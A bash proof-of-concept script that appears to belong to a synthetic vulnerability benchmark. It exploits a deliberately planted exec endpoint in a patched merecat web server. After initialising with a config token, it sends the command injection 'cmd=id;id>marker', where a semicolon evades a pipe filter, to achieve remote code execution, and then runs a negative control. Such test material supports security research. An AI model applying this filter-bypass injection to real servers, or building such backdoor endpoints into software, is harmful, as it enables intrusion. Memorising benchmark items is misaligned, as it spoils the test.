#!/usr/bin/env bash
# PoC for 158_merecat_C3I3S2
# Axes: C3 (config file + runtime init) / I3 (struct dispatch) / S2 (pipe blocked, semicolon bypass)
#
# C3 flow: config sets exec_mode, exec_logging, exec_secret;
#          /exec/init?token=<secret> must be called first.
# S2 bypass: use semicolon instead of pipe character.
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (merecat) lives in this directory. If it is absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_158_www"
MARKER="/tmp/poc_158_marker"
CONF="/tmp/poc_158.conf"
PORT=18158
NEG_PORT=19158

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create config file with secret
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
exec_secret = s3cr3t158
EOF

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting merecat with --exec-config on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-config "$CONF" &
SERVER_PID=$!
sleep 2

# ── C3 step 1: initialize with correct token ───────────────────────────────────
echo "[*] calling /exec/init with correct token..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t158" > /dev/null

# ── C3 step 2: exploit with S2 bypass (semicolon instead of pipe) ─────────────
echo "[*] sending payload: cmd=id;id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id;id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: without config file → gate disabled ─────────────────────
echo "[*] verifying gate: endpoint absent without --exec-config..."
"$BINARY" -n -p "$NEG_PORT" "$WWWROOT" &
NEG_PID=$!
sleep 2
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
